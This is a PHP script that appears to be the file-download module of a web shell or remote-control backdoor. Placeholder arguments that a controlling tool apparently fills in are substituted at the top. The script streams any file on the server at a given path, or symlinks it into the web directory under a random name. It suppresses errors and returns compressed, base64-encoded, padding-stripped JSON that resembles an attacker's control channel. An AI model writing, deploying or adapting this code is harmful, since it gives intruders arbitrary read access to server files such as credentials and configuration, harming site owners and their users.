<?php

$start = microtime(true);
$arguments = [
    'level' => '"^level^"',
    "path" => '"^path^"',
    "mode" => '"^mode^"',
    "extension" => '"^extension^"'
];


function uuid()
{
    $data = random_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function download()
{
    global $arguments, $start;
    extract($arguments, EXTR_SKIP);
    $status = false; $debug = []; $data = [];

    if (file_exists($path))
    {
        if ($mode == 'php')
        {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            header('Content-Length: ' . filesize($path));
            readfile($path);
            return;

        }
        elseif ($mode == 'direct')
        {
            $uid = uuid();
            if (!symlink($path, $uid.$extension))
            {
                @array_push($debug, ['warning' => 'Unable to create symlink to `'.$path.'`']);
            }
            else
            {
                $data['symlink'] = $uid.$extension;
                $data['path'] = __DIR__;
            }
        }
    }
    else
    {
        @array_push($debug, ['error' => 'Unable to locate `'.$path.'`']);
    }

    $response = json_encode([
        'status' => (empty($debug)) ? true : false,
        'time' => microtime(true) - $start,
        'debug' => $debug,
        'operation' => [
            'action' => 'dl',
            'arguments' => $arguments
        ],
        'data' => $data
    ], JSON_UNESCAPED_UNICODE);

    echo str_replace('=', '', base64_encode(gzdeflate($response, $level)));
    // echo $response;
}

@download();

?>